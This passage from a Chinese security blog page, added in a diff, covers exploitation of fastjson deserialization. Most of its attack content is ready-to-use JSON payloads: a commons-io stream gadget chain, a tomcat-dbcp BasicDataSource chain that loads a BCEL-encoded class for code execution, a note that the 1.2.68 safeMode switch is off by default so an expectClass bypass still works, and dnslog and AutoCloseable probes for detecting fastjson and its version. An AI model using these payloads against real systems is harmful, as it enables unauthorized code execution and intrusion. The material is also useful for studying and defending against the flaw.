+<span class="w">      </span><span class="nt">&quot;@type&quot;</span><span class="p">:</span><span class="s2">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">      </span><span class="nt">&quot;inputStream&quot;</span><span class="p">:{</span><span class="w"></span>
+<span class="w">        </span><span class="nt">&quot;@type&quot;</span><span class="p">:</span><span class="s2">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">        </span><span class="nt">&quot;input&quot;</span><span class="p">:{</span><span class="w"></span>
+<span class="w">          </span><span class="nt">&quot;$ref&quot;</span><span class="p">:</span><span class="s2">&quot;$.input&quot;</span><span class="w"></span>
+<span class="w">        </span><span class="p">},</span><span class="w"></span>
+<span class="w">        </span><span class="nt">&quot;branch&quot;</span><span class="p">:{</span><span class="w"></span>
+<span class="w">          </span><span class="nt">&quot;$ref&quot;</span><span class="p">:</span><span class="s2">&quot;$.branch&quot;</span><span class="w"></span>
+<span class="w">        </span><span class="p">},</span><span class="w"></span>
+<span class="w">        </span><span class="nt">&quot;closeBranch&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w"></span>
+<span class="w">      </span><span class="p">},</span><span class="w"></span>
+<span class="w">      </span><span class="nt">&quot;httpContentType&quot;</span><span class="p">:</span><span class="s2">&quot;text/xml&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">      </span><span class="nt">&quot;lenient&quot;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="w"></span>
+<span class="w">      </span><span class="nt">&quot;defaultEncoding&quot;</span><span class="p">:</span><span class="s2">&quot;UTF-8&quot;</span><span class="w"></span>
+<span class="w">    </span><span class="p">}</span><span class="w"></span>
+<span class="w">  </span><span class="p">}</span><span class="w"></span>
+</code></pre></div></p>
+<p>第四个(需要tomcat-dbcp依赖，是tomcat的数据库驱动依赖):<br />
+<div class="highlight"><pre><span></span><code><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="p">{</span><span class="w"></span>
+<span class="w">        </span><span class="nt">&quot;@type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;com.alibaba.fastjson.JSONObject&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">        </span><span class="nt">&quot;x&quot;</span><span class="p">:{</span><span class="w"></span>
+<span class="w">                </span><span class="nt">&quot;@type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">                </span><span class="nt">&quot;driverClassLoader&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">                    </span><span class="nt">&quot;@type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><span class="w"></span>
+<span class="w">                </span><span class="p">},</span><span class="w"></span>
+<span class="w">                </span><span class="nt">&quot;driverClassName&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;$$BCEL$$$l$8b$I$A$...&quot;</span><span class="w"></span>
+<span class="w">        </span><span class="p">}</span><span class="w"></span>
+<span class="w">    </span><span class="p">}:</span><span class="w"> </span><span class="s2">&quot;x&quot;</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+</code></pre></div><br />
+详情分析参考<a href="https://kingx.me/Exploit-FastJson-Without-Reverse-Connect.html">这里</a></p>
+<p>更多的利用链在<a href="http://noahblog.360.cn/blackhat-2021yi-ti-xiang-xi-fen-xi-fastjsonfan-xu-lie-hua-lou-dong-ji-zai-qu-kuai-lian-ying-yong-zhong-de-shen-tou-li-yong-2/">Blackhat 2021 议题详细分析—— FastJson 反序列化漏洞及在区块链应用中的渗透利用</a></p>
+<h4 id="1268">1.2.68<a class="headerlink" href="#1268" title="Permanent link">#</a></h4>
+<p>添加了safeMode这个安全开关，开启后不再有autotype，@type键无效，但是这个开关默认是关闭的，依然可以使用上述的expectclass bypass。</p>
+<h3 id="检测fastjson">检测fastjson<a class="headerlink" href="#检测fastjson" title="Permanent link">#</a></h3>
+<h4 id="dnslog">dnslog<a class="headerlink" href="#dnslog" title="Permanent link">#</a></h4>
+<div class="highlight"><pre><span></span><code><span class="p">{</span><span class="nt">&quot;@type&quot;</span><span class="p">:</span><span class="s2">&quot;java.net.InetAddress&quot;</span><span class="p">,</span><span class="nt">&quot;val&quot;</span><span class="p">:</span><span class="s2">&quot;dnslog&quot;</span><span class="p">}</span><span class="w"> </span><span class="err">在</span><span class="mi">49</span><span class="err">以下才能触发</span><span class="w"></span>
+<span class="p">{</span><span class="nt">&quot;@type&quot;</span><span class="p">:</span><span class="s2">&quot;java.net.Inet4Address&quot;</span><span class="p">,</span><span class="nt">&quot;val&quot;</span><span class="p">:</span><span class="s2">&quot;dnslog&quot;</span><span class="p">}</span><span class="w"></span>
+<span class="p">{</span><span class="nt">&quot;@type&quot;</span><span class="p">:</span><span class="s2">&quot;java.net.Inet6Address&quot;</span><span class="p">,</span><span class="nt">&quot;val&quot;</span><span class="p">:</span><span class="s2">&quot;dnslog&quot;</span><span class="p">}</span><span class="w"></span>
+<span class="p">{</span><span class="nt">&quot;@type&quot;</span><span class="p">:</span><span class="s2">&quot;java.net.InetSocketAddress&quot;</span><span class="p">{</span><span class="nt">&quot;address&quot;</span><span class="p">:,</span><span class="nt">&quot;val&quot;</span><span class="p">:</span><span class="s2">&quot;dnslog&quot;</span><span class="p">}}</span><span class="w"></span>
+<span class="p">{</span><span class="nt">&quot;@type&quot;</span><span class="p">:</span><span class="s2">&quot;com.alibaba.fastjson.JSONObject&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span><span class="nt">&quot;@type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;java.net.URL&quot;</span><span class="p">,</span><span class="w"> </span><span class="nt">&quot;val&quot;</span><span class="p">:</span><span class="s2">&quot;http://dnslog&quot;</span><span class="p">}}</span><span class="s2">&quot;&quot;</span><span class="p">}</span><span class="w"></span>
+<span class="p">{{</span><span class="nt">&quot;@type&quot;</span><span class="p">:</span><span class="s2">&quot;java.net.URL&quot;</span><span class="p">,</span><span class="nt">&quot;val&quot;</span><span class="p">:</span><span class="s2">&quot;http://dnslog&quot;</span><span class="p">}:</span><span class="s2">&quot;aaa&quot;</span><span class="p">}</span><span class="w"></span>
+<span class="err">Se</span><span class="kc">t</span><span class="p">[{</span><span class="nt">&quot;@type&quot;</span><span class="p">:</span><span class="s2">&quot;java.net.URL&quot;</span><span class="p">,</span><span class="nt">&quot;val&quot;</span><span class="p">:</span><span class="s2">&quot;http://dnslog&quot;</span><span class="p">}]</span><span class="w"></span>
+<span class="err">Se</span><span class="kc">t</span><span class="p">[{</span><span class="nt">&quot;@type&quot;</span><span class="p">:</span><span class="s2">&quot;java.net.URL&quot;</span><span class="p">,</span><span class="nt">&quot;val&quot;</span><span class="p">:</span><span class="s2">&quot;http://dnslog&quot;</span><span class="p">}</span><span class="w"></span>
+</code></pre></div>
+<h4 id="检测版本">检测版本<a class="headerlink" href="#检测版本" title="Permanent link">#</a></h4>
+<p>参考了<a href="https://blog.csdn.net/weixin_43510203/article/details/115277081">这篇文章</a>，需要在响应中输出异常才能用。</p>
+<blockquote>
+<p>1.当代码使用 <code>JSON.parseObject(json , clazz)</code>指定期望类的方式去解析 JSON，且 clazz 不能为 fastjson 已设定的大部分类型，如“Hashmap”、“ArrayList”。</p>
+<p>2.当使用<code>JSON.parse(json)</code> 不指定期望类的时候可以通过 AutoCloseable 来触发</p>
+</blockquote>
+<p>所以可用的payload为:<br />
+第一种:<br />
+<div class="highlight"><pre><span></span><code><span class="err">a</span><span class="w"></span>
+</code></pre></div><br />
+第二种:<br />
+<div class="highlight"><pre><span></span><code><span class="p">{</span><span class="nt">&quot;@type&quot;</span><span class="p">:</span><span class="s2">&quot;java.lang.AutoCloseable&quot;</span><span class="w"></span>
+</code></pre></div></p>
+<h2 id="其他注意事项">其他注意事项<a class="headerlink" href="#其他注意事项" title="Permanent link">#</a></h2>
+<p><img alt="" src="https://gitee.com/guuest/images/raw/master/img/1.jpg" /></p>
+
+              
+  
+
+            </article>
+          </div>
+        </div>
+        
+          <a href="#" class="md-top md-icon" data-md-component="top" data-md-state="hidden">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12z"/></svg>
+            回到页面顶部
+          </a>
+        
+      </main>
+      
+        
+<footer class="md-footer">
+<div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+    <div class="md-footer-copyright">
+        
+        
+    </div>
+    <div class="md-social">
+  
+    
+    
+      
+      
+    
+    <a href="https://github.com/WAY29" target="_blank" rel="noopener" title="github.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.0.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+    </a>
+  
+    
+    
+    <a href="mailto:toloveu29@gmail.com" target="_blank" rel="noopener" title="" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill-rule="evenodd" d="M1.75 3A1.75 1.75 0 0 0 0 4.75v14c0 .966.784 1.75 1.75 1.75h20.5A1.75 1.75 0 0 0 24 18.75v-14A1.75 1.75 0 0 0 22.25 3H1.75zM1.5 4.75a.25.25 0 0 1 .25-.25h20.5a.25.25 0 0 1 .25.25v.852l-10.36 7a.25.25 0 0 1-.28 0l-10.36-7V4.75zm0 2.662V18.75c0 .138.112.25.25.25h20.5a.25.25 0 0 0 .25-.25V7.412l-9.52 6.433c-.592.4-1.368.4-1.96 0L1.5 7.412z"/></svg>
+    </a>
+  
+    
+    
+      
+      
+    
+    <a href="https://longlone.top/rss.xml" target="_blank" rel="noopener" title="longlone.top" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill-rule="evenodd" d="M3.5 3.25a.75.75 0 0 1 .75-.75C14.053 2.5 22 10.447 22 20.25a.75.75 0 0 1-1.5 0C20.5 11.275 13.225 4 4.25 4a.75.75 0 0 1-.75-.75zM3.5 19a2 2 0 1 1 4 0 2 2 0 0 1-4 0zm.75-9.5a.75.75 0 0 0 0 1.5 9.25 9.25 0 0 1 9.25 9.25.75.75 0 0 0 1.5 0C15 14.313 10.187 9.5 4.25 9.5z"/></svg>
+    </a>
+  
+</div>
+    </div>
+</div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    <script id="__config" type="application/json">{"base": "../../../..", "features": ["header.autohide", "navigation.expand", "navigation.top", "toc.integrate", "tabs"], "translations": {"clipboard.copy": "\u590d\u5236", "clipboard.copied": "\u5df2\u590d\u5236", "search.config.lang": "ja", "search.config.pipeline": "trimmer, stemmer", "search.config.separator": "[\\uff0c\\u3002]+", "search.placeholder": "\u641c\u7d22", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.term.missing": "\u7f3a\u5c11", "select.version.title": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}, "search": "../../../../assets/javascripts/workers/search.092fa1f6.min.js"}</script>
+    
+    
+      <script src="../../../../assets/javascripts/bundle.5a9542cf.min.js"></script>
+      
+        <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+      
+    
+  </body>
+</html>
